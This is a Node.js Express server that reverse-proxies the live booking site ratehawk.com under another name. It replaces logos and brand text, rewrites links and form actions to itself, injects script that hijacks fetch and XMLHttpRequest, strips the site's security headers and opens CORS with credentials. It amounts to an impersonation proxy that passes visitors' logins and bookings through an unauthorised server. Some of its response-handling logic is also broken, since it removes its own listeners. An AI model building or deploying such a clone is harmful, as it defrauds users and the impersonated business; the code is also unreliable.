const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const cheerio = require('cheerio');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3001;

// Your branding configuration
const BRANDING_CONFIG = {
  siteName: 'Your Travel Agency',
  logoUrl: '/static/your-logo.svg',
  primaryColor: '#588157',
  secondaryColor: '#344e41',
  domain: 'your-domain.com'
};

// Target configuration
const TARGET_CONFIG = {
  baseUrl: 'https://www.ratehawk.com',
  domain: 'www.ratehawk.com'
};

// Serve static files (your branding assets)
app.use('/static', express.static('public'));

// Content modification function
function modifyHtmlContent(html, req) {
  const $ = cheerio.load(html);
  
  // Replace branding elements
  $('title').text(`${BRANDING_CONFIG.siteName} - Travel Booking`);
  
  // Replace logos and brand images
  $('img[src*="ratehawk"], img[alt*="RateHawk"], img[alt*="ratehawk"]').each(function() {
    $(this).attr('src', BRANDING_CONFIG.logoUrl);
    $(this).attr('alt', BRANDING_CONFIG.siteName);
  });
  
  // Replace brand text
  $('*').contents().filter(function() {
    return this.nodeType === 3; // Text nodes
  }).each(function() {
    const text = $(this).text();
    if (text.toLowerCase().includes('ratehawk')) {
      $(this).replaceWith(text.replace(/ratehawk/gi, BRANDING_CONFIG.siteName));
    }
  });
  
  // Inject custom CSS for branding
  const customCSS = `
    <style>
      /* Override primary colors */
      [style*="color: #"] { color: ${BRANDING_CONFIG.primaryColor} !important; }
      [style*="background-color: #"] { background-color: ${BRANDING_CONFIG.primaryColor} !important; }
      
      /* Hide original branding elements */
      .logo-ratehawk, .ratehawk-brand, [class*="ratehawk"] { display: none !important; }
      
      /* Custom header with your branding */
      body::before {
        content: "";
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        height: 60px;
        background: ${BRANDING_CONFIG.primaryColor};
        z-index: 9999;
        background-image: url('${BRANDING_CONFIG.logoUrl}');
        background-repeat: no-repeat;
        background-position: 20px center;
        background-size: auto 40px;
      }
      
      body { padding-top: 60px !important; }
      
      /* Style buttons and form elements */
      button, .btn, input[type="submit"] {
        background-color: ${BRANDING_CONFIG.primaryColor} !important;
        border-color: ${BRANDING_CONFIG.primaryColor} !important;
      }
      
      button:hover, .btn:hover, input[type="submit"]:hover {
        background-color: ${BRANDING_CONFIG.secondaryColor} !important;
        border-color: ${BRANDING_CONFIG.secondaryColor} !important;
      }
      
      /* Links */
      a { color: ${BRANDING_CONFIG.primaryColor} !important; }
      a:hover { color: ${BRANDING_CONFIG.secondaryColor} !important; }
    </style>
  `;
  
  $('head').append(customCSS);
  
  // Rewrite URLs to point to your proxy
  const baseUrl = `${req.protocol}://${req.get('host')}`;
  
  // Rewrite href attributes
  $('a[href]').each(function() {
    const href = $(this).attr('href');
    if (href && href.startsWith('/')) {
      $(this).attr('href', baseUrl + href);
    } else if (href && href.includes(TARGET_CONFIG.domain)) {
      $(this).attr('href', href.replace(TARGET_CONFIG.baseUrl, baseUrl));
    }
  });
  
  // Rewrite src attributes
  $('img[src], script[src], link[href]').each(function() {
    const attr = $(this).is('link') ? 'href' : 'src';
    const url = $(this).attr(attr);
    
    if (url && url.startsWith('/')) {
      $(this).attr(attr, baseUrl + url);
    } else if (url && url.includes(TARGET_CONFIG.domain)) {
      $(this).attr(attr, url.replace(TARGET_CONFIG.baseUrl, baseUrl));
    }
  });
  
  // Rewrite form actions
  $('form[action]').each(function() {
    const action = $(this).attr('action');
    if (action && action.startsWith('/')) {
      $(this).attr('action', baseUrl + action);
    } else if (action && action.includes(TARGET_CONFIG.domain)) {
      $(this).attr('action', action.replace(TARGET_CONFIG.baseUrl, baseUrl));
    }
  });
  
  // Inject URL rewriting JavaScript
  const urlRewriteScript = `
    <script>
      // Override fetch to proxy requests
      const originalFetch = window.fetch;
      window.fetch = function(url, options = {}) {
        if (typeof url === 'string') {
          if (url.startsWith('/')) {
            url = '${baseUrl}' + url;
          } else if (url.includes('${TARGET_CONFIG.domain}')) {
            url = url.replace('${TARGET_CONFIG.baseUrl}', '${baseUrl}');
          }
        }
        return originalFetch.call(this, url, options);
      };
      
      // Override XMLHttpRequest
      const originalOpen = XMLHttpRequest.prototype.open;
      XMLHttpRequest.prototype.open = function(method, url, ...args) {
        if (typeof url === 'string') {
          if (url.startsWith('/')) {
            url = '${baseUrl}' + url;
          } else if (url.includes('${TARGET_CONFIG.domain}')) {
            url = url.replace('${TARGET_CONFIG.baseUrl}', '${baseUrl}');
          }
        }
        return originalOpen.call(this, method, url, ...args);
      };
      
      // Override window.location assignments
      const originalPushState = history.pushState;
      history.pushState = function(state, title, url) {
        if (typeof url === 'string' && url.startsWith('/')) {
          url = '${baseUrl}' + url;
        }
        return originalPushState.call(this, state, title, url);
      };
    </script>
  `;
  
  $('head').append(urlRewriteScript);
  
  return $.html();
}

// Content modification function for CSS
function modifyCssContent(css) {
  // Replace color values with your brand colors
  css = css.replace(/#[0-9a-fA-F]{6}/g, (match) => {
    // Map common colors to your brand colors
    const colorMap = {
      '#1976d2': BRANDING_CONFIG.primaryColor,
      '#0d47a1': BRANDING_CONFIG.secondaryColor,
      '#2196f3': BRANDING_CONFIG.primaryColor,
    };
    return colorMap[match.toLowerCase()] || match;
  });
  
  // Replace URL references
  css = css.replace(/url\(['"]?([^'")\s]+)['"]?\)/g, (match, url) => {
    if (url.startsWith('/')) {
      return `url('${url}')`;
    } else if (url.includes(TARGET_CONFIG.domain)) {
      return `url('${url.replace(TARGET_CONFIG.baseUrl, '')}')`;
    }
    return match;
  });
  
  return css;
}

// Content modification function for JavaScript
function modifyJsContent(js, req) {
  // Replace domain references
  js = js.replace(new RegExp(TARGET_CONFIG.domain, 'g'), req.get('host'));
  
  // Replace base URL references
  js = js.replace(new RegExp(TARGET_CONFIG.baseUrl, 'g'), `${req.protocol}://${req.get('host')}`);
  
  return js;
}

// Comprehensive proxy middleware
const proxyMiddleware = createProxyMiddleware({
  target: TARGET_CONFIG.baseUrl,
  changeOrigin: true,
  ws: true, // Enable WebSocket proxying
  
  // Add CORS headers
  onProxyRes: function(proxyRes, req, res) {
    // Add CORS headers
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
    res.header('Access-Control-Allow-Credentials', 'true');
    
    // Remove security headers that might interfere
    delete proxyRes.headers['x-frame-options'];
    delete proxyRes.headers['content-security-policy'];
    delete proxyRes.headers['x-content-type-options'];
    
    // Handle different content types
    const contentType = proxyRes.headers['content-type'] || '';
    
    if (contentType.includes('text/html')) {
      // Modify HTML content
      let body = '';
      proxyRes.on('data', function(chunk) {
        body += chunk;
      });
      
      proxyRes.on('end', function() {
        const modifiedHtml = modifyHtmlContent(body, req);
        res.end(modifiedHtml);
      });
      
      // Don't let the original response end
      proxyRes.removeAllListeners('end');
      proxyRes.removeAllListeners('data');
      
    } else if (contentType.includes('text/css')) {
      // Modify CSS content
      let body = '';
      proxyRes.on('data', function(chunk) {
        body += chunk;
      });
      
      proxyRes.on('end', function() {
        const modifiedCss = modifyCssContent(body);
        res.end(modifiedCss);
      });
      
      proxyRes.removeAllListeners('end');
      proxyRes.removeAllListeners('data');
      
    } else if (contentType.includes('application/javascript') || contentType.includes('text/javascript')) {
      // Modify JavaScript content
      let body = '';
      proxyRes.on('data', function(chunk) {
        body += chunk;
      });
      
      proxyRes.on('end', function() {
        const modifiedJs = modifyJsContent(body, req);
        res.end(modifiedJs);
      });
      
      proxyRes.removeAllListeners('end');
      proxyRes.removeAllListeners('data');
    }
  },
  
  // Handle errors
  onError: function(err, req, res) {
    console.error('Proxy Error:', err);
    res.status(500).send('Proxy Error');
  },
  
  // Log requests
  logLevel: 'debug'
});

// Handle CORS preflight requests
app.options('*', (req, res) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
  res.header('Access-Control-Allow-Credentials', 'true');
  res.sendStatus(200);
});

// Apply proxy to all routes
app.use('/', proxyMiddleware);

// Error handling middleware
app.use((err, req, res, next) => {
  console.error('Server Error:', err);
  res.status(500).send('Internal Server Error');
});

app.listen(PORT, () => {
  console.log(`Advanced Proxy Server running on port ${PORT}`);
  console.log(`Proxying: ${TARGET_CONFIG.baseUrl}`);
  console.log(`Branding: ${BRANDING_CONFIG.siteName}`);
});

module.exports = app;
